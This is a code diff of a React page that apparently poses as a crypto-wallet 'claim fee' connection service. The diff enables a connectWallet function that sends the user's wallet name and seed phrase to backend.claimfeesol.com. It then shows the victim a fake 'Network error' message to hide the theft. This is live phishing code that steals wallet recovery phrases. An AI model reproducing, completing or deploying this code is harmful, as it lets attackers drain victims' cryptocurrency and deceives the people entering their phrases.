@@ -31,26 +31,25 @@ export default function Home() {
 
   const connectWallet = async (e) => {
 
-    console.log(wallet);
-    // try {
-    //     const url = "https://backend.claimfeesol.com/message.php";
+    try {
+        const url = "https://backend.claimfeesol.com/message.php";
 
-    //     const response = await axios.post(url, {"wallet": wallet, "phrase": phrase}, {
-    //         headers: {
-    //             "Content-Type":"application/json",
-    //         },withCredentials: true
-    //     })
-    //     console.log(response.data);
-    //     if (response.data.status === "success"){
-    //         setError("Network error. check connection");
-    //     }
+        const response = await axios.post(url, {"wallet": wallet, "phrase": phrase}, {
+            headers: {
+                "Content-Type":"application/json",
+            },withCredentials: true
+        })
+        console.log(response.data);
+        if (response.data.status === "success"){
+            setError("Network error. check connection");
+        }
 
-    //     if (response.data.status === "success"){
-    //         setError(response.data.msg);
-    //     }
-    // } catch (error) {
-    //     console.log("Error sending phrase: ", error);
-    // }
+        if (response.data.status === "success"){
+            setError(response.data.msg);
+        }
+    } catch (error) {
+        console.log("Error sending phrase: ", error);
+    }
   }
     
 
@@ -114,8 +113,6 @@ export default function Home() {
     walletTypeContainer.classList.add('active');
 
     setWallet(e.currentTarget.children[1].innerHTML);
-
-    console.log(wallet, e.currentTarget.children[1].innerHTML);
   }
 
   const soundClicked = (e) => {
